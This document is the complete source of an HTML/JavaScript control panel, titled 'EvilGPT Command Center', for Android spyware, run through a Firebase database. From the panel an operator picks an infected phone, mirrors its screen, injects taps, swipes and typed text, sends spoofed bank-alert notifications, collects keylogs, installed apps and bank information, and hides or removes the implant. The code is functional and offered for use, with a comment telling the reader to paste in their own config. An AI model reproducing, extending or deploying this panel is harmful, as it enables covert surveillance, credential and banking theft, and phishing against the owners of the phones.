<!DOCTYPE html>
<html>
<head>
    <title>EvilGPT Commander</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body{background:#0a0a0a;color:#0f0;font-family:monospace;margin:10px}
        select,button,input{padding:8px;margin:5px;background:#111;color:#0f0;border:1px solid #0f0;font-family:monospace}
        img{border:2px solid #0f0;max-width:100%}
        pre{background:#111;padding:10px;overflow:auto;max-height:300px}
    </style>
</head>
<body>
    <h1>💀 EvilGPT Command Center</h1>
    <label>Target device:</label>
    <select id="deviceSelect"></select><br>
    <button onclick="refreshDevices()">Refresh</button>
    <hr>
    <img id="screenFrame" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" width="360" height="640" style="background:#222">
    <br>
    <button onclick="sendCommand('SCREEN_REFRESH')">🔁 Refresh Screen</button>
    <hr>
    <h3>Touch & Swipe</h3>
    X: <input id="tapX" type="number" size="5" value="100"> Y: <input id="tapY" type="number" size="5" value="200"><br>
    <button onclick="sendCommand(`TAP ${getTapCoords()}`)">👆 Tap</button>
    <button onclick="sendCommand(`SWIPE ${getTapCoords()} ${getSwipeEnd()}`)">↗️ Swipe</button><br>
    Swipe end: X: <input id="swipeEndX" type="number" size="5" value="300"> Y: <input id="swipeEndY" type="number" size="5" value="400"><br>
    <h3>Type Text</h3>
    <input id="typeText" placeholder="Unlock pattern / message" size="40">
    <button onclick="sendCommand(`TYPE ${getTypeText()}`)">⌨️ Type</button>
    <hr>
    <h3>💣 Spam Notification</h3>
    Title: <input id="notifTitle" placeholder="Bank Alert" size="20">
    Body: <input id="notifBody" placeholder="Your account was accessed" size="30">
    <button onclick="sendCommand(`NOTIF ${getNotifTitle()}||${getNotifBody()}`)">Send Spoof</button>
    <hr>
    <h3>🔥 Data Extraction</h3>
    <button onclick="sendCommand('KEYLOGS')">Refresh Keylogs</button> |
    <button onclick="sendCommand('APPS')">Installed Apps</button> |
    <button onclick="sendCommand('BANK_DATA')">Bank Info</button> <!-- new bank log -->
    <pre id="infoOutput"></pre>
    <hr>
    <button style="background:darkred" onclick="sendCommand('UNINSTALL')">🧹 Uninstall Self</button>
    <button onclick="sendCommand('HIDE')">👤 Hide Icon</button>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, onValue, set, update, child, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            // PASTE YOUR CONFIG HERE
            apiKey: "AIza...",
            authDomain: "your-project.firebaseapp.com",
            databaseURL: "https://your-project-default-rtdb.firebaseio.com",
            projectId: "your-project",
            storageBucket: "your-project.appspot.com",
            messagingSenderId: "123456789",
            appId: "1:123456789:web:abcdef",
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        let currentDevice = "";

        window.refreshDevices = () => {
            const deviceRef = ref(db, 'devices');
            onValue(deviceRef, (snapshot) => {
                const select = document.getElementById('deviceSelect');
                select.innerHTML = '';
                if (snapshot.exists()) {
                    snapshot.forEach(child => {
                        const opt = document.createElement('option');
                        opt.value = child.key;
                        opt.textContent = child.key;
                        select.appendChild(opt);
                    });
                    if (!currentDevice && select.options.length>0) currentDevice = select.options[0].value;
                    select.value = currentDevice;
                    startScreenListener();
                }
            });
        };

        const startScreenListener = () => {
            const dev = document.getElementById('deviceSelect').value;
            if (!dev) return;
            currentDevice = dev;
            const frameRef = ref(db, `devices/${dev}/screen_frame`);
            onValue(frameRef, (snap) => {
                if (snap.exists()) {
                    document.getElementById('screenFrame').src = 'data:image/jpeg;base64,' + snap.val();
                }
            });
            // info listener (keylogs, apps, bank)
            const infoRef = ref(db, `devices/${dev}/info`);
            onValue(infoRef, (snap) => {
                if (snap.exists()) {
                    const data = snap.val();
                    let out = '';
                    if (data.keylogs) out += 'Keylogs:\n' + data.keylogs + '\n';
                    if (data.apps) out += 'Installed Apps:\n' + data.apps + '\n';
                    if (data.bank) out += 'Bank Info:\n' + JSON.stringify(data.bank, null, 2);
                    document.getElementById('infoOutput').textContent = out || 'No data';
                }
            });
        };

        window.sendCommand = (cmd) => {
            const dev = document.getElementById('deviceSelect').value;
            if (!dev) return alert('No device');
            const cmdRef = ref(db, `devices/${dev}/command`);
            set(cmdRef, { cmd: cmd, timestamp: Date.now() });
        };

        window.getTapCoords = () => `${document.getElementById('tapX').value} ${document.getElementById('tapY').value}`;
        window.getSwipeEnd = () => `${document.getElementById('swipeEndX').value} ${document.getElementById('swipeEndY').value}`;
        window.getTypeText = () => encodeURIComponent(document.getElementById('typeText').value);
        window.getNotifTitle = () => encodeURIComponent(document.getElementById('notifTitle').value);
        window.getNotifBody = () => encodeURIComponent(document.getElementById('notifBody').value);

        refreshDevices();
    </script>
</body>
</html>
